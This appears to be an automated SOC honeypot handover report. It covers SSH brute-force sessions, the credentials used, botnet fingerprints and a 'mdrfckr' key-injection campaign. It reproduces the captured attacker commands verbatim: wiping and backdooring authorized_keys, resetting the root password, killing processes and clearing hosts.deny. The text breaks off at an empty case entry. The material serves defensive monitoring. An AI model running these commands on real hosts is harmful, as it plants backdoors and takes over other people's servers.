# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-29 |
| **Generated At** | 2026-05-29T17:37:25Z |
| **Shift Time** | 17:37 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **471** |
| Confirmed Threats | **419** |
| False Positives Filtered | **52** (11.0%) |
| Unique Attacker IPs | **26** |
| Countries of Origin | **12** |
| High Severity Cases | **10** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **461** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **31** |
| Unique Credential Pairs | **24** |
| Unique Usernames | **14** |
| Unique Passwords | **24** |
| Successful Auth Pairs | **8** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 10 |
| `345gs5662d34` | 5 |
| `ubuntu` | 3 |
| `test` | 2 |
| `admin` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 5 |
| `3245gs5662d34` | 4 |
| `qq123456` | 1 |
| `123qweasdzxc` | 1 |
| `testtest` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 5 |
| `root` | `3245gs5662d34` | 4 |
| `ubuntu` | `qq123456` | 1 |
| `test` | `123qweasdzxc` | 1 |
| `root` | `testtest` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `testtest` | `180.188.45.179` | 2026-05-29T13:09:33 |
| `root` | `Asdfghjkl` | `180.188.45.179` | 2026-05-29T13:20:48 |
| `root` | `QWEzxc123` | `101.32.240.31` | 2026-05-29T13:41:22 |
| `root` | `3245gs5662d34` | `101.32.240.31` | 2026-05-29T13:41:24 |
| `root` | `Admin@@123` | `111.238.174.6` | 2026-05-29T13:47:39 |
| `root` | `3245gs5662d34` | `111.238.174.6` | 2026-05-29T13:47:43 |
| `root` | `Aa1234567890.` | `111.238.174.6` | 2026-05-29T13:49:28 |
| `root` | `Xs123456` | `111.238.174.6` | 2026-05-29T13:56:20 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **471** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 62 |
| Go SSH scanner | 1 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 30 | 3 |
| `03a80b21afa8...` | Modern SSH client | 23 | 2 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 30 | 3 | Mirai/variant |
| `03a80b21afa8...` | libssh | 23 | 2 | Modern SSH client |
| `95420f9d932d...` | libssh | 9 | 3 | — |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:gillwoSrkuIE"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `180.188.45.179`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `111.238.174.6`, `101.32.240.31`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **26** |
| Unique ASNs | **22** |
| High-Risk ASNs | **16** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS25369` | Hydra Communications Ltd | 2 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS55836` | Reliance Jio Infocomm Limited | 1 | LOW |
| `AS2516` | KDDI CORPORATION | 1 | HIGH |
| `AS133775` | Xiamen | 1 | HIGH |
| `AS7713` | PT Telekomunikasi Indonesia | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (10)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-e22500a1e6b4

| Field | Detail |
|---|---|
| **Source IP** | `180.188.45[.]179` |
| **First Seen** | 2026-05-29 13:09 |
| **Last Seen** | 2026-05-29 13:09 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:gillwoSrkuIE"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 13:09:33` | `cowrie.session.connect` |
| `2026-05-29 13:09:33` | `cowrie.client.version` |
| `2026-05-29 13:09:33` | `cowrie.client.kex` |
| `2026-05-29 13:09:33` | `cowrie.login.success` |
| `2026-05-29 13:09:34` | `cowrie.session.params` |
| `2026-05-29 13:09:34` | `cowrie.command.input` |
| `2026-05-29 13:09:34` | `cowrie.command.failed` |
| `2026-05-29 13:09:34` | `cowrie.log.closed` |
| `2026-05-29 13:09:34` | `cowrie.session.params` |
| `2026-05-29 13:09:34` | `cowrie.command.input` |
| `2026-05-29 13:09:34` | `cowrie.session.file_download` |
| `2026-05-29 13:09:34` | `cowrie.log.closed` |
| `2026-05-29 13:09:45` | `cowrie.session.params` |
| `2026-05-29 13:09:45` | `cowrie.command.input` |
| `2026-05-29 13:09:45` | `cowrie.log.closed` |
| `2026-05-29 13:09:45` | `cowrie.session.params` |
| `2026-05-29 13:09:45` | `cowrie.command.input` |
| `2026-05-29 13:09:46` | `cowrie.log.closed` |
| `2026-05-29 13:09:46` | `cowrie.session.params` |
| `2026-05-29 13:09:46` | `cowrie.command.input` |
| `2026-05-29 13:09:46` | `cowrie.session.file_download` |
| `2026-05-29 13:09:46` | `cowrie.log.closed` |
| `2026-05-29 13:09:46` | `cowrie.session.params` |
| `2026-05-29 13:09:46` | `cowrie.command.input` |
| `2026-05-29 13:09:47` | `cowrie.log.closed` |
| `2026-05-29 13:09:47` | `cowrie.session.params` |
| `2026-05-29 13:09:47` | `cowrie.command.input` |
| `2026-05-29 13:09:47` | `cowrie.log.closed` |
| `2026-05-29 13:09:47` | `cowrie.session.params` |
| `2026-05-29 13:09:47` | `cowrie.command.input` |
| `2026-05-29 13:09:47` | `cowrie.command.input` |
| `2026-05-29 13:09:48` | `cowrie.log.closed` |
| `2026-05-29 13:09:48` | `cowrie.session.params` |
| `2026-05-29 13:09:48` | `cowrie.command.input` |
| `2026-05-29 13:09:48` | `cowrie.log.closed` |
| `2026-05-29 13:09:48` | `cowrie.session.params` |
| `2026-05-29 13:09:48` | `cowrie.command.input` |
| `2026-05-29 13:09:49` | `cowrie.log.closed` |
| `2026-05-29 13:09:49` | `cowrie.session.params` |
| `2026-05-29 13:09:49` | `cowrie.command.input` |
| `2026-05-29 13:09:49` | `cowrie.log.closed` |
| `2026-05-29 13:09:49` | `cowrie.session.params` |
| `2026-05-29 13:09:49` | `cowrie.command.input` |
| `2026-05-29 13:09:50` | `cowrie.log.closed` |
| `2026-05-29 13:09:50` | `cowrie.session.params` |
| `2026-05-29 13:09:50` | `cowrie.command.input` |
| `2026-05-29 13:09:50` | `cowrie.log.closed` |
| `2026-05-29 13:09:50` | `cowrie.session.params` |
| `2026-05-29 13:09:50` | `cowrie.command.input` |
| `2026-05-29 13:09:51` | `cowrie.log.closed` |
| `2026-05-29 13:09:51` | `cowrie.session.params` |
| `2026-05-29 13:09:51` | `cowrie.command.input` |
| `2026-05-29 13:09:51` | `cowrie.log.closed` |
| `2026-05-29 13:09:51` | `cowrie.session.params` |
| `2026-05-29 13:09:51` | `cowrie.command.input` |
| `2026-05-29 13:09:51` | `cowrie.log.closed` |
| `2026-05-29 13:09:52` | `cowrie.session.params` |
| `2026-05-29 13:09:52` | `cowrie.command.input` |
| `2026-05-29 13:09:52` | `cowrie.log.closed` |
| `2026-05-29 13:09:52` | `cowrie.session.params` |
| `2026-05-29 13:09:52` | `cowrie.command.input` |
| `2026-05-29 13:09:52` | `cowrie.log.closed` |
| `2026-05-29 13:09:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.188.45[.]179` to AbuseIPDB if not already reported
- [ ] Block `180.188.45[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-789aa61dcabd

| Field | Detail |
|---|---|
| **Source IP** | `180.188.45[.]179` |
| **First Seen** | 2026-05-29 13:20 |
| **Last Seen** | 2026-05-29 13:21 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:NmCnl5RxV4BZ"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 13:20:47` | `cowrie.session.connect` |
| `2026-05-29 13:20:47` | `cowrie.client.version` |
| `2026-05-29 13:20:47` | `cowrie.client.kex` |
| `2026-05-29 13:20:48` | `cowrie.login.success` |
| `2026-05-29 13:20:48` | `cowrie.session.params` |
| `2026-05-29 13:20:48` | `cowrie.command.input` |
| `2026-05-29 13:20:48` | `cowrie.command.failed` |
| `2026-05-29 13:20:49` | `cowrie.log.closed` |
| `2026-05-29 13:20:49` | `cowrie.session.params` |
| `2026-05-29 13:20:49` | `cowrie.command.input` |
| `2026-05-29 13:20:49` | `cowrie.session.file_download` |
| `2026-05-29 13:20:49` | `cowrie.log.closed` |
| `2026-05-29 13:21:06` | `cowrie.session.params` |
| `2026-05-29 13:21:06` | `cowrie.command.input` |
| `2026-05-29 13:21:07` | `cowrie.log.closed` |
| `2026-05-29 13:21:07` | `cowrie.session.params` |
| `2026-05-29 13:21:07` | `cowrie.command.input` |
| `2026-05-29 13:21:07` | `cowrie.log.closed` |
| `2026-05-29 13:21:07` | `cowrie.session.params` |
| `2026-05-29 13:21:07` | `cowrie.command.input` |
| `2026-05-29 13:21:07` | `cowrie.session.file_download` |
| `2026-05-29 13:21:07` | `cowrie.log.closed` |
| `2026-05-29 13:21:08` | `cowrie.session.params` |
| `2026-05-29 13:21:08` | `cowrie.command.input` |
| `2026-05-29 13:21:08` | `cowrie.log.closed` |
| `2026-05-29 13:21:09` | `cowrie.session.params` |
| `2026-05-29 13:21:09` | `cowrie.command.input` |
| `2026-05-29 13:21:09` | `cowrie.log.closed` |
| `2026-05-29 13:21:09` | `cowrie.session.params` |
| `2026-05-29 13:21:09` | `cowrie.command.input` |
| `2026-05-29 13:21:09` | `cowrie.command.input` |
| `2026-05-29 13:21:10` | `cowrie.log.closed` |
| `2026-05-29 13:21:10` | `cowrie.session.params` |
| `2026-05-29 13:21:10` | `cowrie.command.input` |
| `2026-05-29 13:21:11` | `cowrie.log.closed` |
| `2026-05-29 13:21:11` | `cowrie.session.params` |
| `2026-05-29 13:21:11` | `cowrie.command.input` |
| `2026-05-29 13:21:11` | `cowrie.log.closed` |
| `2026-05-29 13:21:11` | `cowrie.session.params` |
| `2026-05-29 13:21:11` | `cowrie.command.input` |
| `2026-05-29 13:21:12` | `cowrie.log.closed` |
| `2026-05-29 13:21:12` | `cowrie.session.params` |
| `2026-05-29 13:21:12` | `cowrie.command.input` |
| `2026-05-29 13:21:12` | `cowrie.log.closed` |
| `2026-05-29 13:21:13` | `cowrie.session.params` |
| `2026-05-29 13:21:13` | `cowrie.command.input` |
| `2026-05-29 13:21:13` | `cowrie.log.closed` |
| `2026-05-29 13:21:13` | `cowrie.session.params` |
| `2026-05-29 13:21:13` | `cowrie.command.input` |
| `2026-05-29 13:21:13` | `cowrie.log.closed` |
| `2026-05-29 13:21:14` | `cowrie.session.params` |
| `2026-05-29 13:21:14` | `cowrie.command.input` |
| `2026-05-29 13:21:14` | `cowrie.log.closed` |
| `2026-05-29 13:21:14` | `cowrie.session.params` |
| `2026-05-29 13:21:14` | `cowrie.command.input` |
| `2026-05-29 13:21:14` | `cowrie.log.closed` |
| `2026-05-29 13:21:15` | `cowrie.session.params` |
| `2026-05-29 13:21:15` | `cowrie.command.input` |
| `2026-05-29 13:21:15` | `cowrie.log.closed` |
| `2026-05-29 13:21:16` | `cowrie.session.params` |
| `2026-05-29 13:21:16` | `cowrie.command.input` |
| `2026-05-29 13:21:16` | `cowrie.log.closed` |
| `2026-05-29 13:21:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.188.45[.]179` to AbuseIPDB if not already reported
- [ ] Block `180.188.45[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e39951df8732

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-05-29 13:41 |
| **Last Seen** | 2026-05-29 13:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 13:41:21` | `cowrie.session.connect` |
| `2026-05-29 13:41:21` | `cowrie.client.version` |
| `2026-05-29 13:41:21` | `cowrie.client.kex` |
| `2026-05-29 13:41:22` | `cowrie.login.success` |
| `2026-05-29 13:41:22` | `cowrie.session.params` |
| `2026-05-29 13:41:22` | `cowrie.command.input` |
| `2026-05-29 13:41:22` | `cowrie.command.failed` |
| `2026-05-29 13:41:22` | `cowrie.log.closed` |
| `2026-05-29 13:41:22` | `cowrie.session.params` |
| `2026-05-29 13:41:22` | `cowrie.command.input` |
| `2026-05-29 13:41:22` | `cowrie.session.file_download` |
| `2026-05-29 13:41:22` | `cowrie.log.closed` |
| `2026-05-29 13:41:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2436be20d4d4

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-05-29 13:41 |
| **Last Seen** | 2026-05-29 13:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 13:41:24` | `cowrie.session.connect` |
| `2026-05-29 13:41:24` | `cowrie.client.version` |
| `2026-05-29 13:41:24` | `cowrie.client.kex` |
| `2026-05-29 13:41:24` | `cowrie.login.success` |
| `2026-05-29 13:41:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a963fe07dc12

| Field | Detail |
|---|---|
| **Source IP** | `111.238.174[.]6` |
| **First Seen** | 2026-05-29 13:47 |
| **Last Seen** | 2026-05-29 13:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 13:47:39` | `cowrie.session.connect` |
| `2026-05-29 13:47:39` | `cowrie.client.version` |
| `2026-05-29 13:47:39` | `cowrie.client.kex` |
| `2026-05-29 13:47:39` | `cowrie.login.success` |
| `2026-05-29 13:47:40` | `cowrie.session.params` |
| `2026-05-29 13:47:40` | `cowrie.command.input` |
| `2026-05-29 13:47:40` | `cowrie.command.failed` |
| `2026-05-29 13:47:40` | `cowrie.log.closed` |
| `2026-05-29 13:47:40` | `cowrie.session.params` |
| `2026-05-29 13:47:40` | `cowrie.command.input` |
| `2026-05-29 13:47:40` | `cowrie.session.file_download` |
| `2026-05-29 13:47:40` | `cowrie.log.closed` |
| `2026-05-29 13:47:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.238.174[.]6` to AbuseIPDB if not already reported
- [ ] Block `111.238.174[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cab32f6c7a8

| Field | Detail |
|---|---|
| **Source IP** | `111.238.174[.]6` |
| **First Seen** | 2026-05-29 13:47 |
| **Last Seen** | 2026-05-29 13:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 13:47:42` | `cowrie.session.connect` |
| `2026-05-29 13:47:42` | `cowrie.client.version` |
| `2026-05-29 13:47:42` | `cowrie.client.kex` |
| `2026-05-29 13:47:43` | `cowrie.login.success` |
| `2026-05-29 13:47:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.238.174[.]6` to AbuseIPDB if not already reported
- [ ] Block `111.238.174[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bed0c2845223

| Field | Detail |
|---|---|
| **Source IP** | `111.238.174[.]6` |
| **First Seen** | 2026-05-29 13:49 |
| **Last Seen** | 2026-05-29 13:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 13:49:27` | `cowrie.session.connect` |
| `2026-05-29 13:49:27` | `cowrie.client.version` |
| `2026-05-29 13:49:28` | `cowrie.client.kex` |
| `2026-05-29 13:49:28` | `cowrie.login.success` |
| `2026-05-29 13:49:28` | `cowrie.session.params` |
| `2026-05-29 13:49:28` | `cowrie.command.input` |
| `2026-05-29 13:49:28` | `cowrie.command.failed` |
| `2026-05-29 13:49:29` | `cowrie.log.closed` |
| `2026-05-29 13:49:29` | `cowrie.session.params` |
| `2026-05-29 13:49:29` | `cowrie.command.input` |
| `2026-05-29 13:49:29` | `cowrie.session.file_download` |
| `2026-05-29 13:49:29` | `cowrie.log.closed` |
| `2026-05-29 13:49:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.238.174[.]6` to AbuseIPDB if not already reported
- [ ] Block `111.238.174[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9227221e5ec6

| Field | Detail |
|---|---|
| **Source IP** | `111.238.174[.]6` |
| **First Seen** | 2026-05-29 13:49 |
| **Last Seen** | 2026-05-29 13:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-29 13:49:31` | `cowrie.session.connect` |
| `2026-05-29 13:49:31` | `cowrie.client.version` |
| `2026-05-29 13:49:31` | `cowrie.client.kex` |
| `2026-05-29 13:49:32` | `cowrie.login.success` |
| `2026-05-29 13:49:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.238.174[.]6` to AbuseIPDB if not already reported
- [ ] Block `111.238.174[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d87bd22f46a7

| Field | Detail |
|---|---|
